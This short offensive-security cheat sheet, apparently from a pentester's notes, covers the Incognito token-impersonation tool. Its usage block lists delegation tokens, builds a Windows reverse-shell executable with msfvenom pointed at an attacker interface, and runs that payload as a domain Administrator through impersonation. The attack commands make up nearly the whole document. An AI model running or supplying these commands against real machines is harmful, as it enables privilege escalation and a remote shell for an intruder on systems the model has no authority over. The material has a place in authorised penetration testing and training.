# Name
Incognito

## Usage
```
# SeImpersonate privilege enabled --> See if there's token to impersonate
# Port of Metasploit's Incognito module

incognito.exe list_tokens -u
# Delegation Tokens Available
# sandbox\Administrator 

msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=80 -f exe -o reverse_80.exe
incognito.exe execute -c "sandbox\Administrator" reverse_80.exe
```

## Source
https://github.com/milkdevil/incognito2/blob/master/incognito.exe

